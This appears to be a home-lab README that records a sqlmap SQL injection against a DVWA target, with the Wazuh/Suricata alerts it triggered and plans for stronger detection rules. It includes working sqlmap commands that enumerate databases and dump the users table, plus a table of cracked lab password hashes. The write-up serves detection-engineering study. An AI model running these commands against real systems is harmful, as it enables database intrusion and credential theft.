# 🗄️ SQL Injection Simulation (SQLMap) - Before Custom Rules

## 📅 Date
April 27, 2026

## 🖥️ Lab Environment

| Host | Role | IP Address |
|------|------|------------|
| Kali Linux | Attacker | `192.168.1.29` |
| Target Server | Victim (DVWA) | `192.168.1.24` |
| Wazuh Manager | SIEM | `192.168.1.18` |

---

# ⚔️ Attack Execution

## Target URL

```text
http://192.168.1.24/vulnerabilities/sqli/?id=1&Submit=Submit
Cookie: security=low
```

## Commands Used

### 1. List All Databases

```bash
sqlmap -u "http://192.168.1.24/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="security=low" --dbs
```

### 2. List Tables in `dvwa`

```bash
sqlmap -u "http://192.168.1.24/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="security=low" -D dvwa --tables
```

### 3. Dump `users` Table

```bash
sqlmap -u "http://192.168.1.24/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="security=low" -D dvwa -T users --dump
```

---

# 📊 Attack Result

| Parameter | Value |
|-----------|-------|
| Vulnerable Parameter | `id` |
| Database Type | MySQL (MariaDB fork) |
| Databases Found | `dvwa`, `information_schema` |
| Tables in dvwa | `guestbook`, `users` |
| Output Location | `/root/.local/share/sqlmap/output/192.168.1.24/dump/dvwa/users.csv` |

## Cracked Passwords

| Password Hash | Cracked Value |
|---------------|---------------|
| `5f4dcc3b5aa765d61d8327deb882cf99` | password |
| `e99a18c428cb38d5f260853678922e03` | abc123 |
| `8d3533d75ae2c3966d7e0d4fcc69216b` | charley |
| `0d107d09f5bbe40cade3de5c71e9e9b7` | letmein |

---

# 🛡️ Wazuh Detection

## Alerts Triggered

| Rule ID | Level | Description |
|---------|-------|-------------|
| 86601 | 3 | ET WEB_SERVER Possible SQL Injection SELECT CAST in HTTP URI |
| 86601 | 3 | ET WEB_SERVER Possible MySQL SQLi Attempt Information Schema Access |
| 86601 | 3 | ET WEB_SERVER ATTACKER SQLi - SELECT and Schema Columns |
| 86601 | 3 | ET SCAN Sqlmap SQL Injection Scan |

## MITRE ATT&CK Mapping

- **T1190** — Exploit Public-Facing Application  
- **T1552** — Unsecured Credentials  

---

# 📈 Key Findings

| Aspect | Status |
|--------|--------|
| Attack Executed | ✅ Yes |
| Data Extracted | ✅ Yes (User Credentials) |
| Wazuh Detected | ✅ Yes |
| Highest Alert Level | 3 (Low) |
| Custom Rule | ❌ Not Enabled |
| Active Response | ❌ Not Enabled |

---

# 📸 Screenshots

| File | Description |
|------|-------------|
| `sqlmap-databases.png` | List of databases found |
| `sqlmap-tables.png` | Tables in dvwa database |
| `sqlmap-dump-complete.png` | Dump completed message |
| `wazuh-alerts-sqlmap.png` | Wazuh SQL injection alerts |

---

# 🎯 Observations

## Before Custom Rules (Current State)

- SQLMap successfully extracted sensitive data (user credentials)  
- Wazuh detected SQL injection attempts  
- Alert level is relatively low (**Level 3**) for a critical vulnerability  
- No automatic blocking — attacker can continue activity  

## What Will Change After Custom Rules

- Higher severity alerts for SQL injection patterns  
- Active Response: Auto-block attacker IP  
- Custom rules for specific SQLMap signatures  

---

# 📁 Files in This Directory

```text
03-sqlmap-injection/
└── before-custom-rules/
    ├── README.md
    ├── sqlmap-commands.txt
    ├── sqlmap-databases.png
    ├── sqlmap-tables.png
    ├── sqlmap-dump-complete.png
    └── wazuh-alerts-sqlmap.png
```

---

# 🔗 Related

- [Nmap Reconnaissance](../01-reconnaissance-nmap/)
- [Hydra Bruteforce](../02-hydra-bruteforce/)

---

# 🧠 Detection Summary

| Category | Value |
|----------|-------|
| Attack Type | SQL Injection |
| Tool Used | SQLMap |
| Detection Source | Suricata via Wazuh |
| MITRE Technique | T1190 |
| Severity | Low (Level 3) |
| Prevention Enabled | No |

---

## ✅ Simulation Checklist

| Task | Status |
|------|--------|
| List Databases | ✅ Completed |
| List Tables | ✅ Completed |
| Dump Users Table | ✅ Completed |
| Screenshot Wazuh Alerts | ✅ Completed |
| Upload to GitHub | ⏳ Pending |

---

# 📂 Current Progress

Three simulations **before custom rules** completed:

| Simulation | Folder | Status |
|------------|--------|--------|
| Nmap | `01-reconnaissance-nmap/before-custom-rules/` | ✅ |
| Hydra | `02-hydra-bruteforce/before-custom-rules/` | ✅ |
| SQLMap | `03-sqlmap-injection/before-custom-rules/` | ✅ |

---

# 🚀 Next Steps

Next phase:

1. Implement **Custom Suricata Rules**
2. Enable **Active Response Auto-Blocking**
3. Configure **Malware Remove**
4. Repeat all three attack simulations
5. Document results under:

```text
after-custom-rules/
```

6. Compare **Before vs After** detections and responses

---

## ✅ Conclusion

This simulation demonstrated successful SQL injection exploitation and credential extraction using SQLMap. While Wazuh generated alerts, detection severity remained low and no preventive response was triggered.

The next phase focuses on improving:

- Detection fidelity  
- Alert severity  
- Automated response capability  
- Attack containment
